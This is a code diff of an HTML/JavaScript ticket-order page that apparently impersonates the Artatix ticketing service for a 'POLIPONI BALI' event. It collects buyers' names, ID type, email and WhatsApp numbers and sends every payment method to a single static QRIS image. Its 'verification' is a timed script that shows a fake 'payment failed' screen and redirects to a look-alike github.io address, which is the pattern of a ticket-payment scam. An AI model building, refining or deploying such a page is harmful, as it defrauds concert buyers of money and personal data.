@@ -3,6 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>POLIPONI BALI - Ticket Form</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
@@ -19,6 +20,7 @@ font-family:'Poppins',sans-serif;
 body{
 background:#f3f5fb;
 color:#111;
+overflow-x:hidden;
 }
 
 /* HEADER */
@@ -36,9 +38,9 @@ z-index:1000;
 }
 
 .logo{
-font-size:34px;
+font-size:32px;
 font-weight:800;
-color:#fff;
+color:white;
 }
 
 .header-right{
@@ -48,8 +50,8 @@ align-items:center;
 }
 
 .circle{
-width:50px;
-height:50px;
+width:48px;
+height:48px;
 border-radius:50%;
 background:#1f57ff;
 display:flex;
@@ -63,7 +65,7 @@ font-size:20px;
 
 .banner{
 width:100%;
-height:420px;
+height:380px;
 overflow:hidden;
 background:#ddd;
 }
@@ -87,22 +89,20 @@ padding:30px;
 .steps{
 display:flex;
 justify-content:space-between;
-align-items:center;
-margin-bottom:30px;
 gap:10px;
+margin-bottom:30px;
 flex-wrap:wrap;
 }
 
 .step{
 flex:1;
 min-width:120px;
-background:white;
-padding:15px;
+padding:14px;
 border-radius:14px;
+background:white;
+font-weight:700;
 text-align:center;
-font-weight:600;
-border:2px solid #e6e6e6;
-transition:.3s;
+border:2px solid #eee;
 }
 
 .step.active{
@@ -115,75 +115,42 @@ border-color:#0038d9;
 
 .grid{
 display:grid;
-grid-template-columns:1fr 1fr 1fr 350px;
+grid-template-columns:1fr 1fr 350px;
 gap:20px;
 align-items:start;
 }
 
 .card{
 background:white;
-border-radius:20px;
-padding:24px;
+padding:25px;
+border-radius:22px;
 box-shadow:0 8px 25px rgba(0,0,0,.05);
 }
 
 .card-title{
-font-size:22px;
-font-weight:700;
-margin-bottom:20px;
+font-size:24px;
+font-weight:800;
+margin-bottom:25px;
 color:#0038d9;
-}
-
-/* TICKET */
-
-.ticket{
-border:2px solid #ececec;
-border-radius:16px;
-padding:18px;
-margin-bottom:15px;
-cursor:pointer;
-transition:.3s;
-}
-
-.ticket:hover{
-border-color:#0038d9;
-}
-
-.ticket.active{
-border-color:#0038d9;
-background:#f2f6ff;
-}
-
-.ticket-top{
-display:flex;
-justify-content:space-between;
-font-weight:700;
-font-size:20px;
-}
-
-.ticket-sub{
-margin-top:5px;
-color:#666;
-font-size:14px;
 }
 
 /* INPUT */
 
 .input-group{
-margin-bottom:16px;
+margin-bottom:18px;
 }
 
 .input-group label{
 display:block;
-margin-bottom:7px;
 font-weight:600;
+margin-bottom:8px;
 }
 
 .input-group input,
 .input-group select{
 width:100%;
-height:52px;
-border-radius:12px;
+height:55px;
+border-radius:14px;
 border:1px solid #ddd;
 padding:0 15px;
 font-size:15px;
@@ -195,41 +162,23 @@ outline:none;
 border-color:#0038d9;
 }
 
-/* PAYMENT */
-
-.payment-option{
-border:2px solid #ececec;
-padding:15px;
-border-radius:14px;
-margin-bottom:12px;
-cursor:pointer;
-transition:.3s;
-}
-
-.payment-option.active{
-border-color:#0038d9;
-background:#f2f6ff;
-}
-
-.payment-title{
-font-weight:700;
-}
-
 /* SUMMARY */
 
 .summary-line{
 display:flex;
 justify-content:space-between;
-margin-bottom:12px;
+margin-bottom:16px;
 font-size:15px;
 }
 
 .total{
-font-size:34px;
+font-size:36px;
 font-weight:800;
-margin-top:20px;
+margin-top:25px;
 color:#0038d9;
 }
+
+/* BUTTON */
 
 .btn{
 width:100%;
@@ -241,7 +190,7 @@ color:white;
 font-size:18px;
 font-weight:700;
 cursor:pointer;
-margin-top:20px;
+margin-top:25px;
 transition:.3s;
 }
 
@@ -249,12 +198,12 @@ transition:.3s;
 transform:translateY(-2px);
 }
 
-/* MODAL QRIS */
+/* MODAL */
 
 .modal{
 position:fixed;
 inset:0;
-background:rgba(0,0,0,.75);
+background:rgba(0,0,0,.8);
 display:none;
 align-items:center;
 justify-content:center;
@@ -264,16 +213,16 @@ z-index:99999;
 
 .modal-box{
 width:100%;
-max-width:480px;
+max-width:500px;
 background:white;
 border-radius:28px;
 overflow:hidden;
-animation:show .3s ease;
+animation:show .4s ease;
 }
 
 @keyframes show{
 from{
-transform:translateY(20px);
+transform:translateY(30px);
 opacity:0;
 }
 to{
@@ -285,12 +234,8 @@ opacity:1;
 .modal-header{
 background:#0038d9;
 padding:25px;
-color:white;
 text-align:center;
-}
-
-.modal-header h2{
-font-size:28px;
+color:white;
 }
 
 .modal-content{
@@ -298,34 +243,31 @@ padding:30px;
 text-align:center;
 }
 
-.qris-box{
-border:4px dashed #0038d9;
-padding:20px;
-border-radius:24px;
-margin-bottom:20px;
-}
-
-.qris-box img{
-width:100%;
-max-width:280px;
-}
-
 .timer{
-font-size:38px;
+font-size:45px;
 font-weight:800;
 color:#ff2a2a;
 margin-bottom:20px;
 }
 
-.upload-box{
-margin-top:20px;
+.qris-box{
+padding:25px;
+border-radius:24px;
+border:4px dashed #0038d9;
+margin:20px 0;
+background:#f5f8ff;
+}
+
+.qris-box img{
+width:100%;
+max-width:260px;
 }
 
 .upload-box input{
 width:100%;
-padding:12px;
+padding:15px;
+border-radius:14px;
 border:1px solid #ddd;
-border-radius:12px;
 }
 
 /* LOADING */
@@ -339,16 +281,18 @@ z-index:999999;
 align-items:center;
 justify-content:center;
 flex-direction:column;
+text-align:center;
+padding:20px;
 }
 
 .loader{
-width:90px;
-height:90px;
-border:8px solid #eee;
-border-top:8px solid #0038d9;
+width:110px;
+height:110px;
+border:10px solid #eee;
+border-top:10px solid #0038d9;
 border-radius:50%;
 animation:spin 1s linear infinite;
-margin-bottom:25px;
+margin-bottom:30px;
 }
 
 @keyframes spin{
@@ -358,32 +302,18 @@ transform:rotate(360deg);
 }
 
 .loading h1{
-font-size:32px;
-margin-bottom:10px;
-}
-
-/* SUCCESS */
-
-.success{
-display:none;
-padding:100px 20px;
-text-align:center;
-}
-
-.success h1{
-font-size:48px;
-color:#0038d9;
+font-size:34px;
 margin-bottom:15px;
 }
 
-.success p{
-font-size:18px;
-color:#555;
+.loading p{
+color:#666;
+font-size:17px;
 }
 
 /* MOBILE */
 
-@media(max-width:1200px){
+@media(max-width:1100px){
 
 .grid{
 grid-template-columns:1fr;
@@ -402,13 +332,17 @@ height:240px;
 <!-- HEADER -->
 
 <div class="header">
-<div class="logo">Artatix</div>
+
+<div class="logo">
+Artatix
+</div>
 
 <div class="header-right">
 <div class="circle">ID</div>
 <div class="circle">⌕</div>
 <div class="circle">☰</div>
 </div>
+
 </div>
 
 <!-- BANNER -->
@@ -419,62 +353,19 @@ height:240px;
 
 <!-- MAIN -->
 
-<div class="container" id="mainPage">
+<div class="container">
 
 <div class="steps">
 <div class="step active">1. Tiket</div>
-<div class="step active">2. Pemesan</div>
-<div class="step active">3. Pengunjung</div>
-<div class="step active">4. Pembayaran</div>
-<div class="step active">5. Konfirmasi</div>
+<div class="step active">2. Data</div>
+<div class="step active">3. Pembayaran</div>
+<div class="step active">4. Upload</div>
+<div class="step active">5. Selesai</div>
 </div>
 
 <div class="grid">
 
-<!-- TICKET -->
-
-<div class="card">
-
-<div class="card-title">
-Pilih Tiket
-</div>
-
-<div class="ticket active">
-<div class="ticket-top">
-<span>Festival</span>
-<span>Rp450K</span>
-</div>
-
-<div class="ticket-sub">
-Presale 1
-</div>
-</div>
-
-<div class="ticket">
-<div class="ticket-top">
-<span>VIP</span>
-<span>Rp750K</span>
-</div>
-
-<div class="ticket-sub">
-Presale 1
-</div>
-</div>
-
-<div class="ticket">
-<div class="ticket-top">
-<span>VVIP</span>
-<span>Rp1.250K</span>
-</div>
-
-<div class="ticket-sub">
-Presale 1
-</div>
-</div>
-
-</div>
-
-<!-- PEMESAN -->
+<!-- FORM -->
 
 <div class="card">
 
@@ -484,26 +375,53 @@ Data Pemesan
 
 <div class="input-group">
 <label>Nama Lengkap *</label>
-<input type="text" required>
+<input type="text" id="nama" required>
 </div>
 
 <div class="input-group">
-<label>Email *</label>
-<input type="email" required>
+<label>Nomor Identitas *</label>
+<select id="identitas" required>
+<option value="">Pilih Identitas</option>
+<option>KTP</option>
+<option>SIM</option>
+<option>PASPOR</option>
+<option>KARTU PELAJAR</option>
+</select>
 </div>
 
 <div class="input-group">
-<label>Nomor WhatsApp *</label>
-<input type="number" required>
+<label>E-mail *</label>
+<input type="email" id="email" required>
 </div>
 
 <div class="input-group">
-<label>Kota *</label>
-<select required>
-<option value="">Pilih Kota</option>
-<option>Bali</option>
-<option>Jakarta</option>
-<option>Bandung</option>
+<label>No. Whatsapp *</label>
+<input type="number" id="wa" required>
+</div>
+
+<div class="input-group">
+<label>Category Tiket *</label>
+<select id="ticketType" onchange="updateSummary()" required>
+<option value="">Pilih Tiket</option>
+<option value="475000">Premium Rp. 475.000</option>
+<option value="650000">Fast Track Rp. 650.000</option>
+</select>
+</div>
+
+<div class="input-group">
+<label>Jumlah Tiket *</label>
+<select id="jumlah" onchange="updateSummary()" required>
+<option value="">Pilih Jumlah</option>
+<option>1</option>
+<option>2</option>
+<option>3</option>
+<option>4</option>
+<option>5</option>
+<option>6</option>
+<option>7</option>
+<option>8</option>
+<option>9</option>
+<option>10</option>
 </select>
 </div>
 
@@ -517,31 +435,14 @@ Data Pemesan
 Metode Pembayaran
 </div>
 
-<div class="payment-option active">
-<div class="payment-title">
-QRIS
-</div>
-<div>
-Semua pembayaran menuju QRIS
-</div>
+<div style="padding:18px;border:2px solid #0038d9;border-radius:18px;background:#f2f6ff;margin-bottom:15px;">
+<h3>M-BANKING</h3>
+<p>Pembayaran otomatis QRIS</p>
 </div>
 
-<div class="payment-option">
-<div class="payment-title">
-Transfer Bank
-</div>
-<div>
-Tetap diarahkan ke QRIS
-</div>
-</div>
-
-<div class="payment-option">
-<div class="payment-title">
-E-Wallet
-</div>
-<div>
-Tetap diarahkan ke QRIS
-</div>
+<div style="padding:18px;border:2px solid #0038d9;border-radius:18px;background:#f2f6ff;">
+<h3>E-WALLET</h3>
+<p>Pembayaran otomatis QRIS</p>
 </div>
 
 </div>
@@ -551,40 +452,30 @@ Tetap diarahkan ke QRIS
 <div class="card">
 
 <div class="card-title">
-Ringkasan
+Ringkasan Pembelian
 </div>
 
 <div class="summary-line">
-<span>Event</span>
-<span>POLIPONI BALI</span>
+<span>Category</span>
+<span id="summaryTicket">-</span>
 </div>
 
 <div class="summary-line">
-<span>Tiket</span>
-<span>Festival</span>
+<span>Jumlah Tiket</span>
+<span id="summaryJumlah">0</span>
 </div>
 
 <div class="summary-line">
-<span>Jumlah</span>
-<span>2</span>
+<span>Total Pembayaran</span>
+<span id="summaryTotal">Rp0</span>
 </div>
 
-<div class="summary-line">
-<span>Subtotal</span>
-<span>Rp900.000</span>
+<div class="total" id="grandTotal">
+Rp0
 </div>
 
-<div class="summary-line">
-<span>Admin</span>
-<span>Rp15.000</span>
-</div>
-
-<div class="total">
-Rp915.000
-</div>
-
-<button class="btn" onclick="openPayment()">
-LANJUTKAN PEMBAYARAN
+<button class="btn" onclick="nextPage()">
+Selanjutnya
 </button>
 
 </div>
@@ -593,37 +484,46 @@ LANJUTKAN PEMBAYARAN
 
 </div>
 
-<!-- MODAL QRIS -->
+<!-- MODAL -->
 
 <div class="modal" id="paymentModal">
 
 <div class="modal-box">
 
 <div class="modal-header">
-<h2>POLIPONI BALI</h2>
-<p>Scan QRIS untuk pembayaran</p>
+<h1>QRIS PEMBAYARAN</h1>
+<p>Silahkan scan QRIS berikut</p>
 </div>
 
 <div class="modal-content">
 
 <div class="timer" id="timer">
-15:00
+07:00
+</div>
+
+<div class="summary-line">
+<span>Total Pembayaran</span>
+<span id="modalTotal">Rp0</span>
 </div>
 
 <div class="qris-box">
 <img src="qris-bayar.png">
 </div>
 
-<h3 style="margin-bottom:10px;">
+<h3 style="margin-bottom:15px;">
 Upload Bukti Pembayaran
 </h3>
 
 <div class="upload-box">
-<input type="file" required>
+<input type="file">
+</div>
+
+<div style="font-size:38px;margin-top:20px;">
+✅
 </div>
 
 <button class="btn" onclick="startLoading()">
-SAYA SUDAH BAYAR
+Bayar Sekarang
 </button>
 
 </div>
@@ -638,29 +538,47 @@ SAYA SUDAH BAYAR
 
 <div class="loader"></div>
 
-<h1>Memverifikasi Pembayaran</h1>
+<h1>Loading Premium</h1>
 
 <p>
-Mohon tunggu sekitar 30 detik...
-</p>
-
-</div>
-
-<!-- SUCCESS -->
-
-<div class="success" id="successPage">
-
-<h1>PEMBAYARAN BERHASIL</h1>
-
-<p>
-E-Ticket berhasil dikirim ke Email & WhatsApp
+Mohon tunggu sebentar...
 </p>
 
 </div>
 
 <script>
 
-function openPayment(){
+function formatRupiah(angka){
+return 'Rp' + angka.toLocaleString('id-ID');
+}
+
+function updateSummary(){
+
+const ticket = document.getElementById('ticketType');
+const jumlah = document.getElementById('jumlah');
+
+const harga = Number(ticket.value || 0);
+const qty = Number(jumlah.value || 0);
+
+const total = harga * qty;
+
+document.getElementById('summaryTicket').innerText =
+ticket.options[ticket.selectedIndex]?.text || '-';
+
+document.getElementById('summaryJumlah').innerText = qty;
+
+document.getElementById('summaryTotal').innerText =
+formatRupiah(total);
+
+document.getElementById('grandTotal').innerText =
+formatRupiah(total);
+
+document.getElementById('modalTotal').innerText =
+formatRupiah(total);
+
+}
+
+function nextPage(){
 
 const requiredInputs = document.querySelectorAll('input[required], select[required]');
 
@@ -678,14 +596,27 @@ return;
 
 }
 
+document.getElementById('loadingPage').style.display='flex';
+
+document.querySelector('#loadingPage h1').innerHTML =
+'Loading Premium';
+
+document.querySelector('#loadingPage p').innerHTML =
+'Menyiapkan halaman pembayaran...';
+
+setTimeout(()=>{
+
+document.getElementById('loadingPage').style.display='none';
+
 document.getElementById('paymentModal').style.display='flex';
 
 startTimer();
 
+},3000);
+
 }
 
-let duration = 900;
-
+let duration = 420;
 let timerStarted = false;
 
 function startTimer(){
@@ -725,17 +656,77 @@ document.getElementById('paymentModal').style.display='none';
 
 document.getElementById('loadingPage').style.display='flex';
 
+document.querySelector('#loadingPage h1').innerHTML =
+'PREMIUM DEWA PROMAX FINAL';
+
+document.querySelector('#loadingPage p').innerHTML =
+'Memverifikasi pembayaran ultra secure system...';
+
 setTimeout(()=>{
 
-document.getElementById('loadingPage').style.display='none';
+document.body.innerHTML = `
 
-document.getElementById('mainPage').style.display='none';
+<div style="
+height:100vh;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+background:#0f172a;
+color:white;
+font-family:Poppins;
+text-align:center;
+padding:20px;
+">
 
-document.getElementById('successPage').style.display='block';
+<img src="failed.png" style="
+width:180px;
+margin-bottom:30px;
+animation:shake 1s infinite;
+">
 
-window.scrollTo(0,0);
+<h1 style="
+font-size:50px;
+margin-bottom:15px;
+color:#ff4d4d;
+">
+PEMBAYARAN FAILED
+</h1>
 
-},30000);
+<p style="
+font-size:18px;
+max-width:500px;
+line-height:1.8;
+color:#ddd;
+">
+Sistem mendeteksi transaksi tidak dapat diverifikasi.
+Anda akan dialihkan otomatis...
+</p>
+
+</div>
+
+<style>
+
+@keyframes shake{
+0%{transform:translateX(0)}
+25%{transform:translateX(-10px)}
+50%{transform:translateX(10px)}
+75%{transform:translateX(-10px)}
+100%{transform:translateX(0)}
+}
+
+</style>
+
+`;
+
+setTimeout(()=>{
+
+window.location.href =
+'https://poliponii2026.github.io/FULL-FITUR/';
+
+},5000);
+
+},60000);
 
 }
 
